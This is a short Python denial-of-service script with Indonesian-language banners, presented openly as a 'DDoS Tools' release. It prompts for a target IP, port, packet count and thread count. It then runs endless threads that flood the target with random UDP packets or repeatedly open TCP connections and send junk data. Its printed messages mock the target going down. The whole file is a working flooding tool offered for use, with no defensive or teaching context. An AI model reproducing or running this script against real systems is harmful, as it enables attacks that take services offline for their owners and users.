#!/usr/bin/env python3
#Kagak Usah Rename BY By Tai Anjing 
import random
import socket
import threading
import os

os.system("clear")
print("DDoS Tools DanuNihDek [Beta Version]")
print("GAK TEMBUS??BERATI ELU BELUM KENAL ASEP")
ip = str(input(" Ip: "))
port = int(input(" Port: "))
choice = str(input(" GasGakYa?(y/n): "))
times = int(input(" Packets: "))
threads = int(input(" Threads: "))
def run():
  data = random._urandom(1024)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" | Permisi!!!|")
    except:
      print("[!] | DanuNumpangLewat!!! |")

def run2():
  data = random._urandom(16)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" Danu Nih DEKKK!!!")
    except:
      s.close()
      print("[*] LOH KOK DOWN??")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()
